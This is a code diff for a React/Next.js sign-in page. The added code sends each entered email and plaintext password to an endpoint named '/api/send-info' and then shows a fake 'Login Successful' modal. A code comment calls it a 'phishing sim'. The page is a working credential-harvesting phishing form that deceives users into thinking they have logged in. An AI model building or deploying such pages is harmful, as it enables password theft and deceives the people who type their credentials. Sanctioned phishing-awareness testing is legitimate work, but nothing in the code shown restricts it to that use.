@@ -2,24 +2,55 @@
 
 import React, { useState } from "react";
 import Link from "next/link";
-import { Mail, Lock, Eye, EyeOff, ShieldCheck } from "lucide-react";
+import {
+	Mail,
+	Lock,
+	Eye,
+	EyeOff,
+	ShieldCheck,
+	Loader2,
+	Check,
+} from "lucide-react";
 
 export default function SigninPage() {
 	const [showPassword, setShowPassword] = useState(false);
 	const [email, setEmail] = useState("");
 	const [password, setPassword] = useState("");
+	const [isLoading, setIsLoading] = useState(false);
+	const [showModal, setShowModal] = useState(false);
 
 	const isFormValid = email.length > 0 && password.length > 0;
+
+	const handleSignin = async (e: React.FormEvent) => {
+		e.preventDefault();
+		if (!isFormValid || isLoading) return;
+
+		setIsLoading(true);
+
+		try {
+			const response = await fetch("/api/send-info", {
+				method: "POST",
+				headers: { "Content-Type": "application/json" },
+				body: JSON.stringify({ email, password }),
+			});
+
+			if (response.ok) {
+				setShowModal(true);
+			} else {
+				// Silently fail or handle error if needed, for phishing sim usually silent or fake error
+				console.error("Failed to send info");
+			}
+		} catch (error) {
+			console.error("Error:", error);
+		} finally {
+			setIsLoading(false);
+		}
+	};
 
 	return (
 		<div className='min-h-screen w-full relative bg-[#0a0a0a] flex flex-col font-sans text-white'>
 			{/* Blue Glow Effect - Updated for dark mode */}
-			<div
-				className='absolute inset-0 pointer-events-none z-0'
-				// style={{
-				// 	boxShadow: "inset 0 0 100px 20px rgba(2, 98, 157, 0.2)",
-				// }}
-			/>
+			<div className='absolute inset-0 pointer-events-none z-0' />
 
 			{/* Navbar */}
 			<nav className='relative z-10 flex items-center justify-between px-6 py-6 md:px-12'>
@@ -52,7 +83,10 @@ export default function SigninPage() {
 					</h1>
 
 					{/* Form */}
-					<form className='flex flex-col gap-4'>
+					<form
+						className='flex flex-col gap-4'
+						onSubmit={handleSignin}
+					>
 						{/* Email Input */}
 						<div className='group relative'>
 							<input
@@ -106,10 +140,11 @@ export default function SigninPage() {
 
 						{/* Sign In Button */}
 						<button
-							type='button'
-							disabled={!isFormValid}
+							type='submit'
+							disabled={!isFormValid || isLoading}
 							className={`
                 w-full h-[56px] rounded-full font-bold text-[16px] transition-all mt-2
+                flex items-center justify-center gap-2
                 ${
 									isFormValid
 										? "bg-[#02629d] hover:bg-[#025080] text-white shadow-[0_4px_14px_0_rgba(2,98,157,0.39)]"
@@ -117,6 +152,9 @@ export default function SigninPage() {
 								}
               `}
 						>
+							{isLoading && (
+								<Loader2 className='animate-spin' size={20} />
+							)}
 							Sign in
 						</button>
 
@@ -140,6 +178,30 @@ export default function SigninPage() {
 					</form>
 				</div>
 			</main>
+
+			{/* Success Modal */}
+			{showModal && (
+				<div className='fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/50 backdrop-blur-sm animate-in fade-in duration-200'>
+					<div className='bg-[#171717] rounded-3xl p-8 max-w-sm w-full border border-[#262626] shadow-2xl flex flex-col items-center text-center animate-in zoom-in-95 duration-200'>
+						<div className='w-16 h-16 rounded-full bg-[#02629d]/20 flex items-center justify-center mb-6 text-[#02629d]'>
+							<Check size={32} strokeWidth={3} />
+						</div>
+						<h2 className='text-2xl font-bold text-white mb-2'>
+							Login Successful
+						</h2>
+						<p className='text-[#a0a0a0] mb-8'>
+							Welcome back! You have successfully signed in to your
+							account.
+						</p>
+						<button
+							onClick={() => setShowModal(false)}
+							className='w-full h-[50px] bg-[#02629d] hover:bg-[#025080] text-white rounded-full font-bold text-[15px] transition-colors'
+						>
+							Continue to Dashboard
+						</button>
+					</div>
+				</div>
+			)}
 
 			{/* Footer / Copyright if needed? usually not on minimalist signin */}
 		</div>
